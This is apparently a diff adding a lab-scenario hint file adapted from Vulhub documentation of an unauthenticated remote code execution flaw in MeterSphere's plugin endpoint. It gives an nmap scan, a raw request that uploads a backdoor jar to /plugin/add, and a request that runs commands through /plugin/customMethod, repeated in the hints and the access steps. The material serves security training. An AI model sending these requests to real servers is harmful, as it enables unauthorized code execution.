@@ -1,0 +1,158 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: metersphere/plugin-rce
+hint_levels:
+  low:
+  - Inspect the metersphere service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 5005,8081. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 5005,8081 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8081/tcp → container 8081/tcp; web: 5005/tcp → container
+    5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8081`, `http://{{NODE_IP}}:8081/plugin/list`.'
+  high:
+  - 'Vulnerability: MeterSphere Plugin Endpoint Remote Code Execution.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    Firstly, by visiting `http://{{NODE_IP}}:8081/plugin/list`, you can see that the success message is returned without being redirected to the login page, indicating that the plugin API can be accessed without authorization.
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/1.png
+
+    Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0>.
+
+    Upload the evil jar plugin to `/plugin/add` interface:
+
+    ```
+    POST /plugin/add HTTP/1.1
+    Host: {{NODE_IP}}:8081
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+    Connection: close
+    Cache-Control: max-age=0
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
+
+    ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
+    Content-Disposition: form-data; name="file"; filename="Evil.jar"
+
+    [Paste your jar file]
+    ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
+
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/2.png
+
+    > **Take care of bytes encoding by yourself if you use Burpsuite to send the package.**
+
+    Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.
+
+    Use following request to execute arbitrary command:
+
+    ```
+    POST /plugin/customMethod HTTP/1.1
+    Host: {{NODE_IP}}:8081
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+    Connection: close
+    Cache-Control: max-age=0
+    Content-Type: application/json
+
+    {
+      "entry": "org.vulhub.Evil",
+      "request": "id"
+    }
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/3.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/README.md'
+  - |-
+    Additional public references:
+    - https://xz.aliyun.com/t/10772
+access_instructions:
+  title: MeterSphere Plugin Endpoint Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 5005,8081. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 5005,8081 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8081/tcp → container 8081/tcp; web: 5005/tcp → container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8081`, `http://{{NODE_IP}}:8081/plugin/list`.
+  - title: Exploit
+    instructions: |-
+      Firstly, by visiting `http://{{NODE_IP}}:8081/plugin/list`, you can see that the success message is returned without being redirected to the login page, indicating that the plugin API can be accessed without authorization.
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/1.png
+
+      Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0>.
+
+      Upload the evil jar plugin to `/plugin/add` interface:
+
+      ```
+      POST /plugin/add HTTP/1.1
+      Host: {{NODE_IP}}:8081
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
+
+      ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
+      Content-Disposition: form-data; name="file"; filename="Evil.jar"
+
+      [Paste your jar file]
+      ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
+
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/2.png
+
+      > **Take care of bytes encoding by yourself if you use Burpsuite to send the package.**
+
+      Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.
+
+      Use following request to execute arbitrary command:
+
+      ```
+      POST /plugin/customMethod HTTP/1.1
+      Host: {{NODE_IP}}:8081
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+      Content-Type: application/json
+
+      {
+        "entry": "org.vulhub.Evil",
+        "request": "id"
+      }
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/3.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/metersphere/plugin-rce/README.md
+  readme_sha256: 184946fc288b18c3c291e7465103fce5ff3f4c22cf56ec37736f481e1dc3bf9c
+  compose_sha256: 94dd982a737bf8dd647554474a1acff0b5759be48793be672d0c29e010925b7d
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
